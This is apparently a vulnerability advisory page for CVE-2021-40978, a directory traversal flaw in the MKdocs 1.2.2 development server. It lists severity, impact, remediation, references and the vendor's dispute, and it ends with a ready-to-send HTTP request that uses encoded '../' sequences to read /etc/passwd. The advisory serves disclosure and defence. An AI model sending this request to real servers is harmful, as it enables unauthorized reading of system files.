---
layout: post
cve_id: CVE-2021-40978
title: MKdocs 1.2.2 - Directory Traversal
pcap: true
pcap_path: /pcaps/2021/CVE-2021-40978.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-40978.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pikpikcu
severity: high
impact: 'An attacker can read or modify sensitive files on the server, potentially
  leading to unauthorized access, data leakage, or system compromise.

  '
remediation: 'Upgrade MKdocs to version 1.2.3 or later to fix the directory traversal
  vulnerability.

  '
reference:
- https://github.com/mkdocs/mkdocs/pull/2604
- https://github.com/nisdn/CVE-2021-40978
- https://nvd.nist.gov/vuln/detail/CVE-2021-40978
- https://github.com/mkdocs/mkdocs
- https://github.com/mkdocs/mkdocs/issues/2601
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2021-40978
  cwe-id: CWE-22
  epss-score: 0.84812
  epss-percentile: 0.99306
  cpe: cpe:2.3:a:mkdocs:mkdocs:1.2.2:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: mkdocs
  product: mkdocs
tags:
- cve2021
- cve
- mkdocs
- lfi
- vuln
---

## üîç Vulnerability Description
The MKdocs 1.2.2 built-in dev-server allows directory traversal using the port 8000, enabling remote exploitation to obtain sensitive information. Note the vendor has disputed the vulnerability (see references) because the dev server must be used in an unsafe way (namely public) to have this vulnerability exploited.

## üåê HTTP Request
```nohighlight
GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

